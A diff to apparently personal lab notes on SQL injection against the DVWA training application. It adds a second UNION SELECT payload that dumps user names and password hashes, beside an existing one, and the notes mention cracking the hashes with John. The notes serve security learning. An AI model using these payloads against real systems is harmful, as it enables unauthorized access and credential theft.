@@ -29,6 +29,10 @@
 - ```
   %' or '0'='0' union select user, password from dvwa.users #
   ```
+- this payload also works from portswigger
+- ```
+  ' UNION SELECT user, password FROM users#
+  ```
 - now we got the password hashes
 - we crack them using john
 - ```
